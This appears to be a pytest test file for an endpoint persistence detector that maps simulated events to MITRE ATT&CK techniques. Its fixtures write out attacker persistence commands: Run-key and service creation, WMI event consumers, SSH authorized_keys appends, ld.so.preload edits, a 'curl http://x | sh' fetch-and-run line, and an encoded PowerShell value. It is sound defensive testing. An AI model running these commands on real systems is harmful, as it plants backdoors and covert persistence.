from __future__ import annotations

import pytest

from centralium.agent.models import AttackStage, EventType, FindingSource, NormalizedEvent
from centralium.agent.persistence import PersistenceDetector

P = PersistenceDetector()


def ev(et: EventType, **kw) -> NormalizedEvent:
    kw.setdefault("source", "test")
    return NormalizedEvent(event_type=et, **kw)


def techniques(e: NormalizedEvent) -> set[str]:
    return {t for f in P.evaluate(e) for t in f.mitre_techniques}


@pytest.mark.parametrize(
    ("event", "tech"),
    [
        (
            ev(
                EventType.REGISTRY_MODIFY,
                registry_key="HKU\\S-1-5\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                process_name="a.exe",
            ),
            "T1547.001",
        ),
        (
            ev(
                EventType.REGISTRY_CREATE,
                registry_key="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit",
            ),
            "T1547.004",
        ),
        (
            ev(
                EventType.REGISTRY_MODIFY,
                registry_key="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
            ),
            "T1546.012",
        ),
        (
            ev(
                EventType.FILE_CREATE,
                file_path="C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.lnk",
            ),
            "T1547.001",
        ),
        (
            ev(
                EventType.SCHEDULED_TASK,
                raw_metadata={"task_name": "\\x", "task_action": "created"},
                command_line="C:\\x.exe",
            ),
            "T1053.005",
        ),
        (
            ev(
                EventType.SERVICE_CHANGE, command_line="C:\\Temp\\svc.exe", raw_metadata={"service_name": "x"}
            ),
            "T1543.003",
        ),
        (ev(EventType.PERSISTENCE, raw_metadata={"persistence_kind": "wmi", "wmi_name": "n"}), "T1546.003"),
        (
            ev(
                EventType.PROCESS_START,
                process_name="schtasks.exe",
                command_line="schtasks /create /tn x /tr C:\\a.exe /sc onlogon",
            ),
            "T1053.005",
        ),
        (
            ev(
                EventType.PROCESS_START,
                process_name="sc.exe",
                command_line="sc create evil binPath= C:\\a.exe",
            ),
            "T1543.003",
        ),
        (
            ev(
                EventType.PROCESS_START,
                process_name="reg.exe",
                command_line="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\a.exe",
            ),
            "T1547.001",
        ),
        (
            ev(
                EventType.PROCESS_START,
                process_name="powershell.exe",
                command_line="Set-WmiInstance -Class CommandLineEventConsumer",
            ),
            "T1546.003",
        ),
        (ev(EventType.FILE_MODIFY, file_path="/etc/cron.d/backdoor"), "T1053.003"),
        (ev(EventType.FILE_CREATE, file_path="/var/spool/cron/crontabs/root"), "T1053.003"),
        (ev(EventType.FILE_CREATE, file_path="/etc/systemd/system/evil.service"), "T1543.002"),
        (ev(EventType.FILE_MODIFY, file_path="/home/u/.bashrc"), "T1546.004"),
        (ev(EventType.FILE_MODIFY, file_path="/etc/profile.d/x.sh"), "T1546.004"),
        (ev(EventType.FILE_MODIFY, file_path="/root/.ssh/authorized_keys"), "T1098.004"),
        (ev(EventType.FILE_CREATE, file_path="/etc/rc.local"), "T1037.004"),
        (ev(EventType.FILE_CREATE, file_path="/home/u/.config/autostart/x.desktop"), "T1547.013"),
        (ev(EventType.FILE_MODIFY, file_path="/etc/ld.so.preload"), "T1574.006"),
        (
            ev(EventType.PROCESS_START, process_name="crontab", command_line="crontab /tmp/mycron"),
            "T1053.003",
        ),
        (
            ev(
                EventType.PROCESS_START,
                process_name="systemctl",
                command_line="systemctl enable evil.service",
            ),
            "T1543.002",
        ),
        (
            ev(
                EventType.PROCESS_START,
                process_name="bash",
                command_line="echo 'ssh-rsa AAA' >> /home/u/.ssh/authorized_keys",
            ),
            "T1098.004",
        ),
    ],
)
def test_persistence_detected_with_mitre(event, tech):
    findings = P.evaluate(event)
    assert findings, event
    assert tech in techniques(event)
    f = findings[0]
    assert f.source == FindingSource.PERSISTENCE and f.attack_stage == AttackStage.PERSISTENCE
    assert 0 < f.score <= 100


@pytest.mark.parametrize(
    "event",
    [
        ev(EventType.FILE_MODIFY, file_path="/home/u/project/notes.txt"),
        ev(EventType.FILE_MODIFY, file_path="/etc/hostname"),
        ev(EventType.REGISTRY_MODIFY, registry_key="HKCU\\Software\\Vendor\\App\\Settings"),
        ev(EventType.PROCESS_START, process_name="crontab", command_line="crontab -l"),
        ev(EventType.PROCESS_START, process_name="systemctl", command_line="systemctl status sshd"),
        ev(EventType.PROCESS_START, process_name="schtasks.exe", command_line="schtasks /query"),
        ev(EventType.FILE_CREATE, file_path="/tmp/x"),
    ],
)
def test_non_persistence_not_flagged(event):
    assert P.evaluate(event) == []


def test_package_manager_is_downgraded_and_payload_raises_score():
    path = "/etc/systemd/system/sshd.service"
    benign = P.evaluate(ev(EventType.FILE_CREATE, file_path=path, process_name="dpkg"))[0]
    sneaky = P.evaluate(
        ev(
            EventType.FILE_CREATE,
            file_path=path,
            process_name="bash",
            executable_path="/tmp/.x/bash",
            command_line="curl http://x | sh",
        )
    )[0]
    assert benign.score <= 15 and benign.severity.value == "INFO"
    assert sneaky.score > 70


def test_suspicious_run_value_scores_higher():
    key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x"
    plain = P.evaluate(
        ev(
            EventType.REGISTRY_MODIFY,
            registry_key=key,
            raw_metadata={"registry_value": "C:\\Program Files\\App\\a.exe"},
        )
    )[0]
    bad = P.evaluate(
        ev(
            EventType.REGISTRY_MODIFY,
            registry_key=key,
            raw_metadata={"registry_value": "powershell -enc AAAA C:\\Users\\Public\\x.ps1"},
        )
    )[0]
    assert bad.score > plain.score
